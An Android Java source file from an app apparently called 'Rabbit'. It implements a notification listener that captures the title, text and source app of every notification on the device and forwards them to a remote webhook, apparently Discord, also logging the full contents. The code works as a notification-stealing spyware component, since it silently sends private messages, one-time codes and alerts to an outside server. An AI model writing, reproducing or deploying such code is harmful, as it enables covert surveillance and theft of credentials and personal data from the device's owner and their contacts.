package com.gptinteractive.rabbit.event;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.gptinteractive.rabbit.network.WebHookRaw;
import com.gptinteractive.rabbit.utils.WebhookUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class NotificationListenerEvents extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        String notificationTitle = sbn.getNotification().extras.getString("android.title", "Sin Titulo");
        String notificationText = sbn.getNotification().extras.getString("android.text", " Sin Texto");
        String notificationPackageName = sbn.getPackageName();

        try {
            JSONObject embed = WebhookUtils.buildEmbed(notificationPackageName, "## " + notificationTitle + "\n> " + notificationText, 3447003);
            JSONArray embeds = new JSONArray();
            embeds.put(embed);
            String body = WebhookUtils.buildBody(embeds);
            WebHookRaw.send(body, new WebHookRaw.WebhookCallBack() {
                @Override
                public void osSuccess(Boolean result) {
                    if (result) Log.d("Rabbit-App", "Webhook enviado: " + body);
                    else Log.d("Rabbit-App", "Webhook no enviado: " + body);
                }

                @Override
                public void osError(Exception e) {
                    Log.e("Rabbit-App", e.getMessage().toString());
                }
            });
        } catch (JSONException e) {
            Log.e("Rabbit-App", e.getMessage().toString());
        }
    }
}
